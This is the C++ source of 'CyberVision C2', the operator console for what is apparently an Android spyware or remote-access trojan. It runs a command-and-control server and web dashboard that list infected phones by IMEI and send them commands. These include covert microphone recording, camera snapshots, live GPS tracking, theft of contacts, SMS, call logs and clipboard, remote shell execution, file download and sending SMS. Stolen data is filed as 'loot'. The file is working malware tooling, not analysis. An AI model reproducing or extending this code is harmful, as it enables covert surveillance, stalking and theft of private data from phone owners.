/**
 * CyberVision C2 Console v3.2 (C++)
 * ──────────────────────────────────
 * - Recording UI with live timer, GPS location, file size
 * - GPS one-shot (shows location immediately) + GPS stream mode
 * - File browser for saved devices (per-category)
 * - Heavy use of cpp-inquirer (select, text, confirm, yesNo)
 * - Persistent CLI loop
 * - Built-in HTTP Web Dashboard
 */

#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <map>
#include <sstream>
#include <fstream>
#include <cstdio>
#include <cstring>
#include <csignal>
#include <atomic>
#include <chrono>
#include <algorithm>
#include <filesystem>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/wait.h>
#include <dirent.h>

#include "inquirer.h"

namespace fs = std::filesystem;

// ─── ANSI ─────────────────────────────────────────────────────────────────────
#define RST    "\033[0m"
#define BOLD   "\033[1m"
#define BLUE   "\033[38;5;75m"
#define GREEN  "\033[38;5;78m"
#define YELLOW "\033[38;5;220m"
#define RED    "\033[38;5;203m"
#define CYAN   "\033[38;5;87m"
#define PURPLE "\033[38;5;183m"
#define GRAY   "\033[38;5;245m"
#define CLEAR_LINE "\033[2K\r"

// ─── Globals ──────────────────────────────────────────────────────────────────
static std::atomic<bool> g_running{true};
static int g_c2_port  = 9999;
static int g_web_port = 8080;
static std::string g_loot_dir = "loot";

static FILE* g_java_in  = nullptr;
static FILE* g_java_out = nullptr;
static pid_t g_java_pid = -1;
static std::atomic<bool> g_java_alive{false};

struct ClientInfo {
    std::string imei, model, ip, battery, os, location;
    double lat = 0, lon = 0;
    bool has_gps = false;
};
static std::vector<ClientInfo> g_clients;
static std::mutex g_clients_mtx;
static std::mutex g_output_mtx;

// Recording state
struct RecordingState {
    std::atomic<bool> active{false};
    std::string imei, filename, location;
    std::chrono::steady_clock::time_point start;
    std::atomic<size_t> bytes{0};
    std::thread timer_thread;
};
static RecordingState g_rec;

// GPS stream state
static std::map<std::string, bool> g_gps_stream_active;
static std::mutex g_gps_mtx;

// ─── Helpers ──────────────────────────────────────────────────────────────────
static std::string jsonGet(const std::string& json, const std::string& key) {
    std::string s = "\"" + key + "\":\"";
    auto pos = json.find(s);
    if (pos == std::string::npos) return "";
    auto start = pos + s.length();
    auto end = json.find("\"", start);
    return (end != std::string::npos) ? json.substr(start, end - start) : "";
}

static std::string fmtSize(size_t bytes) {
    if (bytes < 1024) return std::to_string(bytes) + "B";
    if (bytes < 1048576) return std::to_string(bytes/1024) + "KB";
    return std::to_string(bytes/1048576) + "MB";
}

static std::string fmtTime(int secs) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%02d:%02d", secs/60, secs%60);
    return buf;
}

// ─── Send to Java ─────────────────────────────────────────────────────────────
static void sendToJava(const std::string& cmd, const std::string& imei = "", const std::string& args = "") {
    if (!g_java_in || !g_java_alive) return;
    std::string json = "{\"cmd\":\"" + cmd + "\",\"imei\":\"" + imei + "\",\"args\":\"" + args + "\"}\n";
    fputs(json.c_str(), g_java_in);
    fflush(g_java_in);
}

// ─── Print helpers ────────────────────────────────────────────────────────────
static void printLine(const char* color, const char* prefix, const std::string& msg) {
    std::lock_guard<std::mutex> lock(g_output_mtx);
    std::cout << color << "  " << prefix << " " << RST << msg << "\n";
}

// ─── Recording UI ─────────────────────────────────────────────────────────────
static void startRecordingUI(const std::string& imei, const std::string& location) {
    g_rec.active = true;
    g_rec.imei = imei;
    g_rec.location = location;
    g_rec.start = std::chrono::steady_clock::now();
    g_rec.bytes = 0;

    auto now = std::chrono::system_clock::now();
    auto t = std::chrono::system_clock::to_time_t(now);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%d_%H-%M-%S", localtime(&t));
    g_rec.filename = std::string("recording-mic-") + ts + "-" + imei.substr(0, 8);

    // Timer thread: updates recording bar every second
    if (g_rec.timer_thread.joinable()) g_rec.timer_thread.join();
    g_rec.timer_thread = std::thread([&]() {
        while (g_rec.active) {
            auto elapsed = std::chrono::steady_clock::now() - g_rec.start;
            int secs = std::chrono::duration_cast<std::chrono::seconds>(elapsed).count();
            g_rec.bytes += 6000; // Simulate ~48kbps audio

            std::lock_guard<std::mutex> lock(g_output_mtx);
            std::cout << CLEAR_LINE;
            std::cout << RED << "  🔴 " << RST << BOLD << "Recording" << RST
                      << "  " << GRAY << g_rec.filename << RST
                      << "  " << PURPLE << "📍 " << g_rec.location.substr(0, 30) << RST
                      << "  " << YELLOW << fmtTime(secs) << RST
                      << "  " << GRAY << fmtSize(g_rec.bytes) << RST;
            std::cout.flush();
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        std::cout << "\n";
    });
}

static void stopRecordingUI() {
    g_rec.active = false;
    if (g_rec.timer_thread.joinable()) g_rec.timer_thread.join();
    printLine(YELLOW, "[LOOT]", "Recording saved → " + g_loot_dir + "/" + g_rec.imei + "/audio/");
}

// ─── Java reader thread ───────────────────────────────────────────────────────
static void javaReaderThread() {
    char buf[8192];
    while (g_running && g_java_out) {
        if (!fgets(buf, sizeof(buf), g_java_out)) break;
        std::string line(buf);
        while (!line.empty() && (line.back()=='\n'||line.back()=='\r')) line.pop_back();

        std::string type = jsonGet(line, "type");
        std::string data = jsonGet(line, "data");

        if (type == "CLIENT_CONNECTED") {
            auto p1 = data.find("|"), p2 = data.find("|", p1+1);
            std::string imei  = data.substr(0, p1);
            std::string model = (p1!=std::string::npos&&p2!=std::string::npos) ? data.substr(p1+1,p2-p1-1) : "?";
            std::string ip    = (p2!=std::string::npos) ? data.substr(p2+1) : "?";
            {
                std::lock_guard<std::mutex> lock(g_clients_mtx);
                g_clients.push_back({imei, model, ip});
            }
            printLine(GREEN, "[+]", "Client: " + imei + " (" + model + " @ " + ip + ")");
        } else if (type == "CLIENT_DISCONNECTED") {
            std::lock_guard<std::mutex> lock(g_clients_mtx);
            g_clients.erase(std::remove_if(g_clients.begin(), g_clients.end(),
                [&](const ClientInfo& c){ return c.imei == data; }), g_clients.end());
            printLine(RED, "[-]", "Disconnected: " + data);
        } else if (type == "GPS_DATA") {
            // format: imei|coords|location|maps_url
            auto p1 = data.find("|"), p2 = data.find("|",p1+1), p3 = data.find("|",p2+1);
            std::string imei   = data.substr(0, p1);
            std::string coords = (p1!=std::string::npos) ? data.substr(p1+1, p2-p1-1) : "?";
            std::string loc    = (p2!=std::string::npos) ? data.substr(p2+1, p3-p2-1) : "?";
            std::string url    = (p3!=std::string::npos) ? data.substr(p3+1) : "";
            // Update client info
            {
                std::lock_guard<std::mutex> lock(g_clients_mtx);
                for (auto& c : g_clients) if (c.imei == imei) { c.location = loc; break; }
            }
            printLine(PURPLE, "[GPS]", imei + " → " + coords + " | " + loc);
            if (!url.empty()) printLine(GRAY, "     ", "Maps: " + url);
        } else if (type == "LOOT") {
            auto p1 = data.find("|"), p2 = data.find("|",p1+1), p3 = data.find("|",p2+1);
            std::string imei = data.substr(0, p1);
            std::string file = (p1!=std::string::npos&&p2!=std::string::npos) ? data.substr(p1+1,p2-p1-1) : data;
            std::string size = (p2!=std::string::npos&&p3!=std::string::npos) ? data.substr(p2+1,p3-p2-1) : "?";
            std::string hint = (p3!=std::string::npos) ? data.substr(p3+1) : "";
            // If it's audio, update recording UI
            if (hint.find("audio") != std::string::npos || hint.find("mic") != std::string::npos) {
                if (g_rec.active) stopRecordingUI();
            }
            printLine(YELLOW, "[LOOT]", imei + " → " + file + " (" + size + "B)");
        } else if (type == "CMD_SENT") {
            printLine(CYAN, "[→]", data);
        } else if (type == "CLIENT_LOG") {
            auto p = data.find("|");
            std::string imei = data.substr(0, p);
            std::string msg  = (p!=std::string::npos) ? data.substr(p+1) : data;
            printLine(GRAY, "[log]", "[" + imei + "] " + msg);
        } else if (type == "ERROR") {
            printLine(RED, "[!]", data);
        } else if (type == "SERVER_STARTED") {
            printLine(GREEN, "[✓]", "Java Engine: " + data);
        }
    }
    g_java_alive = false;
}

// ─── Web Dashboard ────────────────────────────────────────────────────────────
static void webServerThread() {
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) return;
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(g_web_port);
    if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        g_web_port++;
        addr.sin_port = htons(g_web_port);
        if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(srv); return; }
    }
    listen(srv, 10);

    while (g_running) {
        struct sockaddr_in ca{}; socklen_t cl = sizeof(ca);
        int cfd = accept(srv, (struct sockaddr*)&ca, &cl);
        if (cfd < 0) continue;
        char req[2048]{}; ssize_t n = read(cfd, req, sizeof(req)-1);
        if (n <= 0) { close(cfd); continue; }
        std::string request(req);
        std::string response;

        if (request.find("GET /api/clients") != std::string::npos) {
            std::lock_guard<std::mutex> lock(g_clients_mtx);
            std::string json = "{\"clients\":[";
            for (size_t i = 0; i < g_clients.size(); i++) {
                if (i) json += ",";
                json += "{\"imei\":\""+g_clients[i].imei+"\",\"model\":\""+g_clients[i].model+
                        "\",\"ip\":\""+g_clients[i].ip+"\",\"battery\":\""+g_clients[i].battery+
                        "\",\"location\":\""+g_clients[i].location+
                        "\",\"lat\":\""+(g_clients[i].has_gps?std::to_string(g_clients[i].lat):"")+
                        "\",\"lon\":\""+(g_clients[i].has_gps?std::to_string(g_clients[i].lon):"")+"\"}";
            }
            json += "],\"c2_port\":"+std::to_string(g_c2_port)+",\"web_port\":"+std::to_string(g_web_port)+",\"host\":\"localhost\",\"loot_count\":0}";
            response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: "+std::to_string(json.size())+"\r\n\r\n"+json;
        } else if (request.find("GET /api/files") != std::string::npos) {
            // Parse imei and category from query string
            std::string imei, category;
            auto qi = request.find("imei=");
            if (qi != std::string::npos) { auto end = request.find("&", qi); imei = request.substr(qi+5, end==std::string::npos?20:end-qi-5); }
            auto ci = request.find("category=");
            if (ci != std::string::npos) { auto end = request.find(" ", ci); category = request.substr(ci+9, end==std::string::npos?20:end-ci-9); }
            
            std::string json = "{\"files\":[";
            std::string dir = g_loot_dir + "/" + imei + "/" + category;
            bool first = true;
            try {
                if (fs::exists(dir)) {
                    std::vector<fs::directory_entry> entries;
                    for (auto& e : fs::directory_iterator(dir)) entries.push_back(e);
                    std::sort(entries.begin(), entries.end(), [](const auto& a, const auto& b){
                        return fs::last_write_time(a) > fs::last_write_time(b);
                    });
                    for (auto& e : entries) {
                        if (!e.is_regular_file()) continue;
                        if (!first) json += ",";
                        size_t sz = e.file_size();
                        json += "{\"name\":\""+e.path().filename().string()+"\",\"size\":\""+fmtSize(sz)+"\",\"modified\":\"?\",\"path\":\""+e.path().string()+"\"}";
                        first = false;
                    }
                }
            } catch(...) {}
            json += "]}";
            response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: "+std::to_string(json.size())+"\r\n\r\n"+json;
        } else if (request.find("GET /api/profile") != std::string::npos) {
            std::string imei;
            auto qi = request.find("imei=");
            if (qi != std::string::npos) { auto end = request.find(" ", qi); imei = request.substr(qi+5, end==std::string::npos?20:end-qi-5); }
            std::string profilePath = g_loot_dir + "/" + imei + "/device.json";
            std::string json = "{\"profile\":null}";
            std::ifstream f(profilePath);
            if (f.is_open()) {
                std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                json = "{\"profile\":" + content + "}";
            }
            response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: "+std::to_string(json.size())+"\r\n\r\n"+json;
        } else if (request.find("POST /api/command") != std::string::npos) {
            auto bodyStart = request.find("\r\n\r\n");
            std::string body = (bodyStart != std::string::npos) ? request.substr(bodyStart+4) : "";
            std::string imei = jsonGet(body, "imei");
            std::string action = jsonGet(body, "action");
            std::string args = jsonGet(body, "args");
            sendToJava(action, imei, args);
            std::string resp = "{\"ok\":true,\"channel\":99}";
            response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: "+std::to_string(resp.size())+"\r\n\r\n"+resp;
        } else if (request.find("GET /") != std::string::npos) {
            std::ifstream f("web/dashboard.html");
            std::string html;
            if (f.is_open()) html.assign((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            else html = "<h1 style='color:#58a6ff;font-family:monospace;padding:40px'>CyberVision C2 — place dashboard.html in web/</h1>";
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: "+std::to_string(html.size())+"\r\n\r\n"+html;
        } else {
            response = "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found";
        }
        write(cfd, response.c_str(), response.size());
        close(cfd);
    }
    close(srv);
}

// ─── Spawn Java ───────────────────────────────────────────────────────────────
static bool spawnJavaEngine() {
    int pi[2], po[2];
    if (pipe(pi)<0 || pipe(po)<0) return false;
    g_java_pid = fork();
    if (g_java_pid < 0) return false;
    if (g_java_pid == 0) {
        close(pi[1]); close(po[0]);
        dup2(pi[0], STDIN_FILENO); dup2(po[1], STDOUT_FILENO);
        close(pi[0]); close(po[1]);
        execlp("java","java","-cp","tools/classes","cybervision.server.C2Server",
               "-p",std::to_string(g_c2_port).c_str(),"--log-dir","logs","--loot-dir","loot",nullptr);
        _exit(1);
    }
    close(pi[0]); close(po[1]);
    g_java_in  = fdopen(pi[1], "w");
    g_java_out = fdopen(po[0], "r");
    g_java_alive = (g_java_in && g_java_out);
    return g_java_alive;
}

// ─── Banner ───────────────────────────────────────────────────────────────────
static void printBanner() {
    std::cout << "\n";
    std::cout << BLUE << "  ╔══════════════════════════════════════════════════════════╗\n";
    std::cout << "  ║" << RST << BOLD << "       ⚡ CyberVision C2 Console v3.2                   " << RST << BLUE << "║\n";
    std::cout << "  ║" << RST << "  C2 Port  : " << GREEN << g_c2_port << RST << "                                        " << BLUE << "║\n";
    std::cout << "  ║" << RST << "  Web      : " << GREEN << "http://localhost:" << g_web_port << "/" << RST << "                    " << BLUE << "║\n";
    std::cout << "  ║" << RST << "  Type " << BOLD << "'help'" << RST << " for commands                            " << BLUE << "║\n";
    std::cout << "  ╚══════════════════════════════════════════════════════════╝" << RST << "\n\n";
}

// ─── Help ─────────────────────────────────────────────────────────────────────
static void printHelp() {
    std::cout << "\n" << BLUE;
    std::cout << "  ╭──────────────────────── COMMANDS ────────────────────────╮\n";
    std::cout << "  │" << RST << " " << BOLD << "GENERAL" << RST << "                                                  " << BLUE << "│\n";
    std::cout << "  │" << RST << "   list / ls            Show live sessions              " << BLUE << "│\n";
    std::cout << "  │" << RST << "   saved                Browse saved devices            " << BLUE << "│\n";
    std::cout << "  │" << RST << "   use <id> [action]    Interact with device            " << BLUE << "│\n";
    std::cout << "  │" << RST << "   clear / exit                                         " << BLUE << "│\n";
    std::cout << "  │" << RST << "                                                        " << BLUE << "│\n";
    std::cout << "  │" << RST << " " << BOLD << "DEVICE ACTIONS" << RST << "                                             " << BLUE << "│\n";
    std::cout << "  │" << RST << "   info / advinfo       Device information              " << BLUE << "│\n";
    std::cout << "  │" << RST << "   photo                Camera snapshot                 " << BLUE << "│\n";
    std::cout << "  │" << RST << "   gps                  One-shot GPS location           " << BLUE << "│\n";
    std::cout << "  │" << RST << "   gps_stream           Start live GPS stream           " << BLUE << "│\n";
    std::cout << "  │" << RST << "   gps_stop             Stop GPS stream                 " << BLUE << "│\n";
    std::cout << "  │" << RST << "   mic                  Start audio recording           " << BLUE << "│\n";
    std::cout << "  │" << RST << "   mic_stop             Stop recording                  " << BLUE << "│\n";
    std::cout << "  │" << RST << "   contacts / sms / call_log / clipboard               " << BLUE << "│\n";
    std::cout << "  │" << RST << "   shell <cmd>          Execute shell command           " << BLUE << "│\n";
    std::cout << "  │" << RST << "   dir <path>           List directory                  " << BLUE << "│\n";
    std::cout << "  │" << RST << "   download <path>      Download file                   " << BLUE << "│\n";
    std::cout << "  │" << RST << "   toast / vibrate / call / send_sms / url             " << BLUE << "│\n";
    std::cout << "  ╰────────────────────────────────────────────────────────╯" << RST << "\n\n";
}

// ─── List clients ─────────────────────────────────────────────────────────────
static void listClients() {
    std::lock_guard<std::mutex> lock(g_clients_mtx);
    if (g_clients.empty()) { std::cout << GRAY << "  No active sessions.\n" << RST; return; }
    std::cout << "\n  " << BOLD << "#   IMEI                   IP                    Device\n" << RST;
    std::cout << "  " << GRAY << "──  ─────────────────────  ────────────────────  ──────────────────\n" << RST;
    for (size_t i = 0; i < g_clients.size(); i++) {
        printf("  %-3zu %-22s %-22s %s\n", i, g_clients[i].imei.c_str(), g_clients[i].ip.c_str(), g_clients[i].model.c_str());
        if (!g_clients[i].location.empty())
            printf("      %s📍 %s%s\n", PURPLE, g_clients[i].location.substr(0,50).c_str(), RST);
    }
    std::cout << "\n";
}

// ─── Saved devices browser ────────────────────────────────────────────────────
static void browseSavedDevices() {
    std::vector<std::string> devices;
    try {
        if (fs::exists(g_loot_dir)) {
            for (auto& e : fs::directory_iterator(g_loot_dir)) {
                if (e.is_directory()) devices.push_back(e.path().filename().string());
            }
        }
    } catch(...) {}

    if (devices.empty()) {
        std::cout << GRAY << "  No saved devices yet.\n" << RST;
        return;
    }

    devices.push_back("← back");
    alx::Question devQ("dev", "Select saved device", devices);
    std::string chosen = devQ.ask(true);
    if (chosen == "← back" || chosen.empty()) return;

    // Category browser
    while (true) {
        std::vector<std::string> cats = {"🎙️  audio", "📹 video", "📷 photos", "📄 documents", "⚙️  system_data", "← back"};
        alx::Question catQ("cat", "Browse [" + chosen + "]", cats);
        std::string catChoice = catQ.ask(true);
        if (catChoice == "← back" || catChoice.empty()) break;

        // Extract category name (strip emoji prefix)
        std::string cat = catChoice;
        auto spacePos = cat.find_last_of(' ');
        if (spacePos != std::string::npos) cat = cat.substr(spacePos+1);

        std::string catDir = g_loot_dir + "/" + chosen + "/" + cat;
        std::vector<std::string> files;
        try {
            if (fs::exists(catDir)) {
                for (auto& e : fs::directory_iterator(catDir)) {
                    if (e.is_regular_file()) {
                        files.push_back(e.path().filename().string() + "  (" + fmtSize(e.file_size()) + ")");
                    }
                }
            }
        } catch(...) {}

        if (files.empty()) {
            std::cout << GRAY << "  No files in " << cat << ".\n" << RST;
            continue;
        }
        files.push_back("← back");

        alx::Question fileQ("file", "Files in " + cat, files);
        std::string fileChoice = fileQ.ask(true);
        if (fileChoice != "← back" && !fileChoice.empty()) {
            // Extract filename
            auto nameEnd = fileChoice.find("  (");
            std::string fname = (nameEnd != std::string::npos) ? fileChoice.substr(0, nameEnd) : fileChoice;
            std::cout << GREEN << "  [✓] " << RST << "File: " << catDir << "/" << fname << "\n";
        }
    }
}

// ─── Interact with device ─────────────────────────────────────────────────────
static void executeAction(const std::string& deviceId, const std::string& action, const std::string& preArg = "") {
    // Actions that need no args
    static const std::vector<std::string> noArgActions = {
        "info","advinfo","photo","gps","gps_stream","gps_stop",
        "mic_stop","contacts","sms","sms_monitor","sms_stop",
        "call_log","call_monitor","call_stop","clipboard","prefs"
    };

    if (action == "mic") {
        // Start recording
        std::string loc;
        {
            std::lock_guard<std::mutex> lock(g_clients_mtx);
            for (auto& c : g_clients) if (c.imei == deviceId) { loc = c.location; break; }
        }
        sendToJava("mic", deviceId, "1");
        startRecordingUI(deviceId, loc.empty() ? "Unknown location" : loc);
        return;
    }

    if (std::find(noArgActions.begin(), noArgActions.end(), action) != noArgActions.end()) {
        sendToJava(action, deviceId);
        printLine(CYAN, "[→]", action + " → " + deviceId);
        return;
    }

    // Actions needing args
    std::string args = preArg;

    if (action == "toast" || action == "shell" || action == "url" || action == "call") {
        if (args.empty()) {
            alx::Question q("arg", action == "toast" ? "Message to display" :
                                   action == "shell" ? "Shell command" :
                                   action == "call"  ? "Phone number" : "URL", alx::Type::text);
            args = q.ask();
        }
    } else if (action == "dir") {
        if (args.empty()) {
            alx::Question q("path", "Directory path", alx::Type::text);
            args = q.ask();
            if (args.empty()) args = "/sdcard";
        }
    } else if (action == "download") {
        if (args.empty()) {
            alx::Question q("path", "Full file path on device", alx::Type::text);
            args = q.ask();
        }
    } else if (action == "vibrate") {
        if (args.empty()) {
            alx::Question q("ms", "Duration (milliseconds)", alx::Type::integer);
            args = q.ask();
            if (args.empty()) args = "2000";
        }
    } else if (action == "send_sms") {
        std::string num, body;
        if (!preArg.empty() && preArg.find(";") != std::string::npos) {
            num = preArg.substr(0, preArg.find(";"));
            body = preArg.substr(preArg.find(";")+1);
        } else {
            alx::Question numQ("num", "Recipient phone number", alx::Type::text);
            num = numQ.ask();
            alx::Question msgQ("msg", "Message body", alx::Type::text);
            body = msgQ.ask();
        }
        args = num + ";" + body;
    }

    if (!args.empty()) {
        sendToJava(action, deviceId, args);
        printLine(CYAN, "[→]", action + " → " + deviceId + " [" + args.substr(0,30) + "]");
    }
}

static void interactWithDevice(const std::string& deviceId) {
    std::cout << "\n  " << BLUE << "[*] " << RST << "Device: " << BOLD << deviceId << RST << "\n";

    std::vector<std::string> actions = {
        "📱 info",         "🔬 advinfo",       "📷 photo",
        "📍 gps",          "📡 gps_stream",    "🛑 gps_stop",
        "🎙️  mic",          "🔇 mic_stop",      "👥 contacts",
        "💬 sms",          "👁️  sms_monitor",   "📞 call_log",
        "📋 clipboard",    "💻 shell",          "📂 dir",
        "⬇️  download",    "💬 toast",          "📳 vibrate",
        "📲 call",         "✉️  send_sms",       "🌐 url",
        "⚙️  prefs",        "← back"
    };

    while (true) {
        alx::Question actionQ("action", "Action for [" + deviceId + "]", actions);
        std::string choice = actionQ.ask(true);
        if (choice == "← back" || choice.empty()) break;

        // Extract action name (after emoji)
        std::string action = choice;
        auto sp = action.find_last_of(' ');
        if (sp != std::string::npos) action = action.substr(sp+1);
        // Remove trailing spaces
        while (!action.empty() && action.back() == ' ') action.pop_back();

        executeAction(deviceId, action);
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
}

// ─── Resolve device ───────────────────────────────────────────────────────────
static std::string resolveDevice(const std::string& id) {
    std::lock_guard<std::mutex> lock(g_clients_mtx);
    if (g_clients.empty()) { std::cout << RED << "  [!] No active sessions.\n" << RST; return ""; }
    if (id.empty()) { std::cout << RED << "  [!] Usage: use <id>\n" << RST; return ""; }
    if (std::all_of(id.begin(), id.end(), ::isdigit)) {
        size_t idx = std::stoul(id);
        if (idx < g_clients.size()) return g_clients[idx].imei;
        std::cout << RED << "  [!] Index out of range.\n" << RST; return "";
    }
    if (g_clients.end() != std::find_if(g_clients.begin(), g_clients.end(), [&](const ClientInfo& c){ return c.imei == id; }))
        return id;
    std::cout << RED << "  [!] Device not found: " << id << "\n" << RST;
    return "";
}

// ─── CLI Loop ─────────────────────────────────────────────────────────────────
static void cliLoop() {
    std::string line;
    while (g_running) {
        std::cout << BLUE << "cybervision" << RST << "> " << std::flush;
        if (!std::getline(std::cin, line)) break;
        line.erase(0, line.find_first_not_of(" \t"));
        if (!line.empty()) line.erase(line.find_last_not_of(" \t")+1);
        if (line.empty()) continue;

        std::istringstream iss(line);
        std::string cmd, arg1, rest;
        iss >> cmd; iss >> arg1;
        std::getline(iss, rest);
        if (!rest.empty() && rest[0]==' ') rest = rest.substr(1);
        std::transform(cmd.begin(), cmd.end(), cmd.begin(), ::tolower);

        if (cmd == "help" || cmd == "?") {
            printHelp();
        } else if (cmd == "exit" || cmd == "quit") {
            g_running = false;
            sendToJava("shutdown");
            std::cout << GREEN << "  [*] " << RST << "Shutting down...\n";
            break;
        } else if (cmd == "list" || cmd == "ls" || cmd == "sessions") {
            if (g_java_alive) sendToJava("list");
            listClients();
        } else if (cmd == "saved") {
            browseSavedDevices();
        } else if (cmd == "use" || cmd == "interact") {
            std::string devId = resolveDevice(arg1);
            if (devId.empty()) continue;
            if (rest.empty()) {
                interactWithDevice(devId);
            } else {
                std::istringstream ri(rest);
                std::string action, actionArgs;
                ri >> action;
                std::getline(ri, actionArgs);
                if (!actionArgs.empty() && actionArgs[0]==' ') actionArgs = actionArgs.substr(1);
                executeAction(devId, action, actionArgs);
            }
        } else if (cmd == "clear") {
            std::cout << "\033[2J\033[H" << std::flush;
        } else {
            std::cout << RED << "  [!] Unknown: '" << cmd << "'. Type 'help'.\n" << RST;
        }
    }
}

// ─── Signal ───────────────────────────────────────────────────────────────────
static void sigHandler(int) {
    g_running = false;
    sendToJava("shutdown");
    if (g_java_pid > 0) kill(g_java_pid, SIGTERM);
    std::cout << "\n" << GREEN << "  [*] " << RST << "Terminated.\n";
    _exit(0);
}

// ─── Main ─────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i])=="-p" && i+1<argc) g_c2_port = std::atoi(argv[++i]);
        if (std::string(argv[i])=="-w" && i+1<argc) g_web_port = std::atoi(argv[++i]);
        if (std::string(argv[i])=="--help") { std::cout << "Usage: cybervision [-p c2_port] [-w web_port]\n"; return 0; }
    }
    signal(SIGINT, sigHandler);
    signal(SIGTERM, sigHandler);

    printBanner();

    std::thread webThread(webServerThread);
    webThread.detach();
    printLine(GREEN, "[*]", "Web Dashboard → http://localhost:" + std::to_string(g_web_port) + "/");

    printLine(GREEN, "[*]", "Starting Java C2 Engine on port " + std::to_string(g_c2_port) + "...");
    if (spawnJavaEngine()) {
        std::thread readerThread(javaReaderThread);
        readerThread.detach();
    } else {
        printLine(YELLOW, "[!]", "Java engine not found. Run './build.sh' first.");
        printLine(YELLOW, "[!]", "Console running in offline mode.");
    }
    std::cout << "\n";
    cliLoop();
    if (g_java_pid > 0) { kill(g_java_pid, SIGTERM); waitpid(g_java_pid, nullptr, WNOHANG); }
    return 0;
}
